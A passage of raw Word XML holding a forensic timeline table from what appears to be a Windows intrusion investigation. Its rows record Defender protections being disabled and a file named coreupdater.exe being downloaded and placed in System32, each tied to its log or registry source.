            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-030, T-005, T-024</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>high</w:t>
              <w:br/>
              <w:t>Windows Defender Real-time Protection Disabled | {"Product Name":"%%827","Product Version":"4.18.2009.2"} | {}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | %%827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35493</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-030, T-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:46.680210</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HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SpyNetReporting = 0x2 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SpyNetReporting = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35494</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:47.699207</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HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35495</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:47.785620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Spynet</w:t>
              <w:br/>
              <w:t>Antivirus | Windows Defender | SpyNetReporting=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:47.785620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Spynet</w:t>
              <w:br/>
              <w:t>Antivirus | Windows Defender | SubmitSamplesConsent=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8619</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:49.843705</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5007 | Microsoft-Windows-Windows Defender | The antimalware platform configuration changed | Old Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35496</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-030, T-024</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:57.907806</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\ELJ4KX67\coreupdater[1].exe</w:t>
              <w:br/>
              <w:t>FileCreate [Archive|NotContentIndexed] entry=24493-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35845</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-029, I-018, T-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>size=7168</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#27972</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-029, F-030, I-005, T-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU</w:t>
              <w:br/>
              <w:t>User Activity | OpenSavePidlMRU | 0=Extension: exe Absolute path: This PC\Downloads\coreupdater.exe | Opened: 2020-09-19 03:40:00.6916578 | MRU: 0 Details: Type: Root folder: GUID, Value: This PC</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Type: Root folder: GUID, Value: Downloads</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Short name: coreupdater.exe</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Type: File, Value: coreupdater.exe</w:t>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:br/>
              <w:t>Extension blocks found: 1</w:t>
              <w:br/>
              <w:br/>
              <w:t>---------------------- Block 0 (Beef0004)---------------</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#847</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>* mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_OpenSavePidlMRU.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>exe mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_OpenSavePidlMRU.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027, F-029, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: LastVisitedPidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder used by an application (dialog box)</w:t>
              <w:br/>
              <w:t>This PC\Downloads</w:t>
              <w:br/>
              <w:t>appli=PickerHost.exe mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_LastVisitedPidlMRU.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.847956</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35860</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027, F-029, I-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.863618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
